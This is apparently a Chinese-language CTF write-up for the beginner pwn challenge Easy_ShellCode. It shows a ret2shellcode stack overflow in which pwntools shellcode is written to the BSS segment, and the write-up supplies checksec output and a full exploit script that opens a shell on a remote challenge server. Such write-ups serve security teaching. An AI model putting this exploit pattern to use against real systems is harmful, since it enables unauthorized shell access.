---
title: 基础栈溢出ret2shellcode 写入BSS段
layout: doc
---
# {{$frontmatter.title}}
[[toc]]

## pwntools生成shellcode
```py
from pwn import *
context(os="linux", arch='amd64') # 需要设置，否则64位报错
# 32 bit
shellcode = shellcraft.sh()
shellcode_asm = asm(shellcode)

# 64 bit
shellcode = shellcraft.amd64.sh()
shellcode_asm = asm(shellcode)
```

## 基础检查
> 本例题是PolarD&N的基础入门pwn题 Easy_ShellCode
```zsh
┌──(kali㉿kali)-[~/win/Downloads]
└─$ file Easy_ShellCode 
Easy_ShellCode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a397c2f97ee491b559ba464305c76619d631224, not stripped
                                                                                          
┌──(kali㉿kali)-[~/win/Downloads]
└─$ checksec --file=Easy_ShellCode 
[*] '/home/kali/win/Downloads/Easy_ShellCode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

## IDA反编译源码
![alt text](/images/image-9.png)

![alt text](/images/image-10.png)

发现str是在bss段 可以写入shellcode
read函数 buf 存在缓冲区溢出
获取str地址

## 编写exp
```py
from pwn import *
context(os="linux", arch='i386')
# 32 bit
shellcode = shellcraft.sh()
shellcode_asm = asm(shellcode)

# io = process("./Easy_ShellCode")
io = remote("120.46.59.242",2053)
io.sendline(shellcode_asm)

padding = 0x68 + 4 # 32 bit
shellcode_addr = 0x0804A080

io.sendline(b'a'*padding + p32(shellcode_addr))
io.interactive()
```
> 本地打不通，远程可以，是很正常的~！